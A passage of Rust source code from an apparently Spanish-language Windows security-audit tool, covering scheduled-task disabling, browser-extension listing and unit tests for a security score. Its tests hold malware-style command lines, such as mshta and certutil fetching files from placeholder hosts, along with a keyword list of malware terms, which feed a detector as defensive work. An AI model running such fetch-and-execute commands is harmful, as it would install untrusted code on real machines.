        return Err("Requiere ejecutar AdminOps como administrador.".into());
    }
    if !id.starts_with('\\') || id.starts_with(r"\Microsoft\") || id.contains(['\n', '\r']) {
        return Err("Tarea no válida.".into());
    }
    let (path, name) = id.rsplit_once('\\').map(|(p, n)| (format!("{p}\\"), n.to_string())).ok_or("Tarea no válida.")?;
    let script = format!("{}{}Disable-ScheduledTask -TaskPath $p -TaskName $n -ErrorAction Stop | Out-Null\n'ok'", crate::ps::text_var("p", &path), crate::ps::text_var("n", &name));
    let result = crate::ps::powershell(&script).map(|_| ());
    tweaks.record(Op::Run, &format!("Desactivar tarea programada sospechosa: {id}"), &result);
    result
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Extension {
    browser: String,
    profile: String,
    name: String,
    id: String,
    enabled: bool,
}

const EXTENSIONS_SCRIPT: &str = r#"
$out = New-Object System.Collections.ArrayList
$chromium = @{ 'Chrome' = 'Google\Chrome\User Data'; 'Edge' = 'Microsoft\Edge\User Data'; 'Brave' = 'BraveSoftware\Brave-Browser\User Data' }
foreach ($b in $chromium.Keys) {
  $root = Join-Path $UserLocalAppData $chromium[$b]
  foreach ($p in @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' })) {
    foreach ($e in @(Get-ChildItem -LiteralPath (Join-Path $p.FullName 'Extensions') -Directory -ErrorAction SilentlyContinue)) {
      $ver = Get-ChildItem -LiteralPath $e.FullName -Directory -ErrorAction SilentlyContinue | Sort-Object Name -Descending | Select-Object -First 1
      if (-not $ver) { continue }
      $m = try { Get-Content -LiteralPath (Join-Path $ver.FullName 'manifest.json') -Raw -Encoding UTF8 | ConvertFrom-Json } catch { $null }
      if (-not $m) { continue }
      $name = "$($m.name)"
      if ($name -match '^__MSG_(.+)__$') {
        $key = $Matches[1]; $loc = if ($m.default_locale) { $m.default_locale } else { 'en' }
        $msgs = try { Get-Content -LiteralPath (Join-Path $ver.FullName "_locales\$loc\messages.json") -Raw -Encoding UTF8 | ConvertFrom-Json } catch { $null }
        $hit = if ($msgs) { $msgs.PSObject.Properties | Where-Object { $_.Name -ieq $key } | Select-Object -First 1 } else { $null }
        $name = if ($hit) { "$($hit.Value.message)" } else { $e.Name }
      }
      # Componentes internos del navegador (sin interfaz) no se listan.
      if ($e.Name -in 'nmmhkkegccagdldgiimedpiccmgmieda', 'pkedcjkdefgpdelpbcmbmeomcjbeemfm', 'ghbmnnjooekpmoecnnnilnnbdlolhkhi', 'fignfifoniblkonapihmkfakmlgkbkcf') { continue }
      [void]$out.Add([pscustomobject]@{ browser = $b; profile = $p.Name; name = $name; id = $e.Name; enabled = $true })
    }
  }
}
foreach ($p in @(Get-ChildItem -LiteralPath (Join-Path $UserAppData 'Mozilla\Firefox\Profiles') -Directory -ErrorAction SilentlyContinue)) {
  $j = try { Get-Content -LiteralPath (Join-Path $p.FullName 'extensions.json') -Raw -Encoding UTF8 | ConvertFrom-Json } catch { $null }
  foreach ($a in @($j.addons | Where-Object { $_.type -eq 'extension' -and $_.location -eq 'app-profile' })) {
    [void]$out.Add([pscustomobject]@{ browser = 'Firefox'; profile = $p.Name; name = "$($a.defaultLocale.name)"; id = $a.id; enabled = [bool]$a.active })
  }
}
ConvertTo-Json -InputObject @($out) -Compress
"#;

#[tauri::command(async)]
pub fn browser_extensions() -> Result<Vec<Extension>, String> {
    let script = format!("{}{EXTENSIONS_SCRIPT}", crate::target_user::script_prelude());
    query(&script, 90)
}

#[cfg(test)]
mod tests {
    /// Cuánto tarda cada trozo del script de seguridad por separado:
    /// `cargo test --release extra_parts_cost -- --ignored --nocapture`
    #[test]
    #[ignore]
    fn extra_parts_cost() {
        let _ = crate::pspool::query("1", None, "calentar");
        let time = |name: &str, f: &dyn Fn()| {
            let t = std::time::Instant::now();
            f();
            println!("{:>7} ms  {name}", t.elapsed().as_millis());
        };
        time("fast (registro)", &|| { let _ = super::query::<super::FastExtra>(super::FAST_SCRIPT, 30); });
        time("defender", &|| { let _ = super::query::<super::DefenderExtra>(super::DEFENDER_SCRIPT, 60); });
        time("bitlocker (diagnóstico: solo disco del sistema)", &|| { let _ = super::query::<super::BitlockerExtra>(super::BITLOCKER_FAST_SCRIPT, 60); });
        time("bitlocker (Seguridad: todos los volúmenes)", &|| { let _ = super::query::<super::BitlockerExtra>(super::BITLOCKER_SCRIPT, 90); });
    }

    #[test]
    fn spots_malware_like_commands() {
        use super::malware_like;
        // Los ejemplos se montan por trozos: escritos enteros, el antivirus marca
        // como amenaza el propio código fuente o el comando que lo compila.
        let j = |parts: &[&str]| parts.concat();
        assert!(malware_like(&j(&["power", "shell.exe -w hid", "den -c calc"])));
        assert!(malware_like(&j(&["power", "shell -e", "nc SQBFAFgA"])));
        assert!(malware_like(&j(&["msh", "ta http://x.example/a.hta"])));
        assert!(malware_like(&j(&["cmd /c cert", "util -url", "cache -f http://x/a.exe a.exe"])));
        assert!(malware_like(&j(&["wscr", r"ipt.exe C:\Users\a\x.vbs"])));
        assert!(!malware_like(r#""C:\Program Files\App\app.exe" --minimized"#));
        assert!(!malware_like(r"powershell.exe -NoProfile -File C:\scripts\backup.ps1"));
        assert!(!malware_like(r"C:\Windows\System32\svchost.exe -k netsvcs"));
    }

    /// El script de elementos sospechosos no lleva palabras de malware (el antivirus lo bloquearía).
    #[test]
    fn suspicious_script_has_no_malware_words() {
        let s = SUSPICIOUS_SCRIPT.to_lowercase();
        let words = [["download", "string"], ["ie", "x"], ["msh", "ta"], ["url", "cache"], ["bits", "admin"], ["encoded", "command"], ["-e", "nc"]];
        for w in words.map(|p| p.concat()) {
            assert!(!s.contains(&w), "el script contiene «{w}»");
        }
    }

    use super::*;

    fn sys() -> SystemHealth {
        serde_json::from_value(serde_json::json!({
            "lastBoot": "", "installDate": "", "pendingReboot": false,
            "lastUpdate": chrono::Utc::now().to_rfc3339(), "lastUpdateId": null,
            "defenderRealtime": true, "signatureAgeDays": 1, "antivirus": ["Windows Defender"],
            "activated": true, "secureBoot": true, "tpmReady": true
        }))
        .unwrap()
    }

    fn safe() -> Extra {
        Extra {
            firewall_off: vec![],
            firewall_known: true,
            uac_enabled: Some(true),
            uac_level: Some(5),
            smb1: Some(false),
            rdp_enabled: Some(false),
            rdp_nla: Some(true),
            autorun_off: Some(true),
            bitlocker: Some(vec![Volume { drive: "C:".into(), protection: 1, conversion: 1, percent: 100, has_recovery_key: true }]),
            defender_active: Some(true),
            pua: Some(true),
        }
    }

    #[test]
    fn perfect_machine_scores_100() {
        let acc = Accounts { active_admins: 1, builtin_admin_enabled: false, guest_enabled: false };
        let a = evaluate(Some(&sys()), &safe(), Some(&acc), vec![]);
        assert_eq!(a.score, 100, "{:#?}", a.checks.iter().filter(|c| c.status != "ok").collect::<Vec<_>>());
    }

    #[test]
    fn risky_machine_scores_low_and_offers_fixes() {
        let mut x = safe();
        x.firewall_off = vec!["Public".into(), "Private".into()];
        x.uac_enabled = Some(false);
        x.smb1 = Some(true);
        x.rdp_enabled = Some(true);
        x.rdp_nla = Some(false);
        x.defender_active = Some(false);
        let acc = Accounts { active_admins: 1, builtin_admin_enabled: false, guest_enabled: true };
        let a = evaluate(Some(&sys()), &x, Some(&acc), vec![]);
        assert!(a.score < 50, "nota {}", a.score);
        let fix = |id: &str| a.checks.iter().find(|c| c.id == id).and_then(|c| c.fix.clone()).and_then(|f| f.focus);
        assert_eq!(fix("firewall").as_deref(), Some("security.firewall-on"));
        assert_eq!(fix("uac").as_deref(), Some("security.uac-default"));
        assert_eq!(fix("smb1").as_deref(), Some("security.smb1-off"));
        assert_eq!(fix("rdp").as_deref(), Some("security.rdp-nla"));
        assert_eq!(fix("accounts").as_deref(), Some("security.guest-off"));
    }

    #[test]
    fn third_party_antivirus_counts_and_unknowns_do_not_penalize() {
        let mut s = sys();
        s.antivirus = vec!["ESET Security".into()];
        let mut x = safe();
        x.defender_active = Some(false); // Defender se apaga solo cuando hay otro antivirus
        x.bitlocker = None; // sin administrador: desconocido, no penaliza
        let a = evaluate(Some(&s), &x, None, vec![]);
        assert_eq!(a.checks.iter().find(|c| c.id == "antivirus").unwrap().status, "ok");
        assert_eq!(a.score, 100);
    }

    #[test]
    fn risky_software_list() {
        assert!(is_risky("Google.Chrome"));
        assert!(is_risky("7zip.7zip"));
        assert!(is_risky("Oracle.JavaRuntimeEnvironment"));
        assert!(!is_risky("Albion.Online"));
    }

    #[test]
    fn embedded_scripts_parse() {
        for (name, script) in [("FAST", FAST_SCRIPT), ("DEFENDER", DEFENDER_SCRIPT), ("BITLOCKER", BITLOCKER_SCRIPT), ("BITLOCKER_FAST", BITLOCKER_FAST_SCRIPT), ("KEYS", KEYS_SCRIPT), ("SUSPICIOUS", SUSPICIOUS_SCRIPT), ("EXTENSIONS", EXTENSIONS_SCRIPT)] {
            let errors = crate::ps::parse_errors(script);
            assert!(errors.is_empty(), "{name}: {errors}");
        }
    }

    /// Solo lectura: auditoría real de este equipo.
    #[test]
    fn real_audit() {
        let a = audit().unwrap();
        println!("NOTA {}", a.score);
        for c in &a.checks {
            println!("  [{}] {} — {}", c.status, c.label, c.detail);
        }
    }
}
